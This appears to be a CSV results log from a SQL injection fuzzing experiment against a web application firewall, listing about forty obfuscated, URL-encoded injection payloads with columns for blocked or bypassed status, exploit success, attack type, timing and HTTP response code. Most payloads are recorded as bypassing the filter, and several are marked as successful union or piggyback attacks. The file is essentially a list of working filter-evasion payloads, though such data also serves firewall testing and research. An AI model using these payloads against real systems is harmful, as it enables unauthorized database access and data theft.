Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'||+!@<@.%0b||+not+{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)%0bor,Blocked,No,None,Unknown,0.0042,69.28,No,403
0'<@!=1.+||+not%0btrue=%0b(not%0b{x%0b(select+1)}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.008,69.67,No,500
0%27<@!=1.%0b||+not%0b{x%0b(select%0b1)}=1=+(!%0b{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0212,69.94,No,200
0'<@=1.+||%0bnot%0b{x+(select%0b1)}=1=+(not+{a+1}=1)%0b||',Blocked,No,None,Unknown,0.0058,69.94,No,403
0%27or+1<@+or%0bnot%0b1=%0b(!%0b{a%0b1}=1)+||',Blocked,No,None,Unknown,0.019,69.94,No,403
0'<@=1.+||+!%0b{x%0b(select%0b1)}=1=%0b(not+{a%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0108,69.94,No,500
0'<@!=.1+or+not%0b{x+(select%0b1)}=1=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0132,69.94,No,500
0'<@=1%0b||%0bnot%0b{x+(select%0b1)}=1=+(false)%0bor%27,Bypassed,No,None,booleanAtk,0.0133,69.94,No,500
0'<@=1+or+!+{x+(select%0b1)}=1=+(!+{`if`+1}=1)+or',Blocked,No,None,Unknown,0.0091,69.94,No,403
0%27<@!=1%0bor%0bnot+{a%0b1}=1=%0b(!%0b{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0188,69.94,No,500
0%27<@!=1%0b||+!%0b1=%0b(!+1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0296,69.94,No,200
0%27<@=.1%0b||+not+{a+1}=1=%0b(!%0b{a%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0135,69.94,No,200
0'<@=.1%0bor+not~0=+(!%0b{a+1}=1)+||%27,Bypassed,No,None,Unknown,0.0101,69.94,No,500
0%27<@=1.%0b||+!+{x%0b(select+1)}=1=+(not%0btrue)+||',Bypassed,No,None,Unknown,0.0155,69.94,No,500
0%27<@=1+or%0b{`if`+1}=1%0blike+{x%0b(select+1)}=1%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0081,70.07,No,200
0'<@=1.%0bor+not+1=%0b(not+{x+(select%0b1)}=1)--+,Bypassed,No,None,piggyAtk,0.0212,70.19,No,500
0%27<@=.1+||+!%0b{a+1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0101,70.19,No,200
0%27<@!=1.+or%0b0=+(not%7efalse)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0123,70.19,No,200
0%27<@=1.+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0187,70.19,No,200
0%27<@!=1%0bor%0bnot%0b{x+(select+1)}=1=+(not%0b{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0154,70.19,No,500
0%27<@!=.1+or+not+{a%0b1}=1=%0b(not%7efalse)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0162,70.19,No,200
0'<@!=1%0b||+not+{a+1}=1=+(!~false)+or',Bypassed,No,None,booleanAtk,0.015,70.19,No,500
0%27<@=1.%0b||%0bnot+{`if`+1}=1=+(not%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0155,70.19,No,500
0'<@=1.%0bor+!%0b{`if`+1}=1=%0b(!+{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0209,70.19,No,500
0%27<@!=1%0b||+!+{x+(select%0b1)}=1=%0b(not~0)+||',Bypassed,No,None,Unknown,0.0094,70.19,No,500
0%27<@=.1%0b||+not+{x+(select+1)}=1=+(not%0b{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0069,70.19,No,200
0'<@=1.%0bor+{x%0b(select+1)}=1+like+{x+(select+1)}=1%0b||%27,Bypassed,No,None,Unknown,0.0128,70.19,No,500
0'<@!=.1%0bor+!+{`if`+1}=1=+(not%0b{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0204,70.19,No,500
0%27<@=1.+||+!%0b{x+(select%0b1)}=1=%0b(!~false)%0bor',Bypassed,No,None,booleanAtk,0.0108,70.19,No,500
0%27<@!=1+||+!+{`if`%0b1}=1=+(not%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0179,70.19,No,200
0'<@=.1+or+!+{`if`%0b1}=1=%0b(not+{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.0168,70.19,No,500
0'<@=1+or+!%7efalse=%0b(!%7e0)%0bor%27,Bypassed,No,None,booleanAtk,0.0168,70.19,No,500
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=+(0)%0b||',Bypassed,No,None,Unknown,0.0109,70.19,No,500
0'<@=.1+||+!%7e0=%0b(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0125,70.19,No,500
0%27<@=1.%0bor+not%0b{x+(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0171,70.19,No,500
0'||+@<@.+||%0b!%7e0=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.017,70.19,No,500
0%27<@=1.+||+!+{x+(select+1)}=1=%0b(not+{x+(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0098,70.19,No,403
0%27<@!=1+||+not+{`if`%0b1}=1=+(!+{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0119,70.19,No,500
0'<@=.1+||%0bnot+{x+(select%0b1)}=1=+(!~0)%23,Blocked,No,None,piggyAtk,0.0117,70.19,No,403
0%27<@=.1+||%0bnot+{x+(select%0b1)}=1=%0b(not%0b{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0129,70.19,No,403
